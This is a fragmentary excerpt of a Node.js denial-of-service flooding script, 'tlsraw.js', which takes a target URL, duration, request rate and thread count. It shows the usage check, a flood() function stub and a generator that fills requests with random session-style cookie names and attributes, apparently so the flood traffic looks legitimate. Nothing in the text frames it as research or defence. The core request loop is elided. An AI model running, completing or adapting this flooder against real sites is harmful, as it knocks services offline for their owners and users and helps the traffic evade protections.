...
if (process.argv.length < 6) {
    console.log("\x1b[31mUsage: node tlsraw.js <target> <time> <rate> <threads>\x1b[0m");
    console.log("\x1b[33mExample: node tlsraw.js https://example.com 60 5 4\x1b[0m");
    process.exit(1);
}
...
function flood() {
    try {
        ...
        // Генерация случайных кук
        const cookie = generateRandomCookie();
...
function generateRandomCookie() {
    const cookieNames = [
        '_ga', '_gid', '_gat', 'PHPSESSID', 'sessionid', 'csrftoken',
        'remember_me', 'user_id', 'token', 'auth', 'login', 'visitor_id'
    ];
    
    const cookieName = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const cookieValue = generateRandomString(16, 32);
    
    // Дополнительные параметры куки (опционально)
    const options = [];
    if (Math.random() > 0.5) options.push('Secure');
    if (Math.random() > 0.5) options.push('HttpOnly');
    if (Math.random() > 0.3) options.push(`SameSite=${Math.random() > 0.5 ? 'Lax' : 'Strict'}`);
    
    return `${cookieName}=${cookieValue}` + (options.length > 0 ? '; ' + options.join('; ') : '');
}
